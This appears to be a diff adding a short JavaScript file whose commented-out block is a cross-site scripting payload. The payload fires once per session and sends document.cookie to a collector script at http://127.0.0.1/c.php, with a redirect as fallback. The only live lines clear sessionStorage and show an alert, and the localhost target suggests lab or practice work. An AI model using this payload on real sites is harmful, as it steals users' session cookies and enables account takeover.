@@ -1,0 +1,25 @@
+// popisHere = sessionStorage.getItem("popisHere"); 
+// if(popisHere){
+// console.log("same");
+// }else{
+// 	sessionStorage.setItem("popisHere", true);
+// 	fetch('http://127.0.0.1/c.php?c='+escape(document.cookie))
+// 	  .then(response => {
+// 	    if (response.ok) {
+// 	      console.log('Website loaded successfully');
+// 	    } else {
+// 	      location.href='http://127.0.0.1/c.php?c='+escape(document.cookie);
+// 	      // Add your series of steps here for handling the error
+// 	    }
+// 	  })
+// 	  .catch(error => {
+// 	    location.href='http://127.0.0.1/c.php?c='+escape(document.cookie);
+// 	    // Add your series of steps here for handling the error
+// 	  });
+// }
+
+
+
+
+ sessionStorage.clear(); 
+ alert("done");
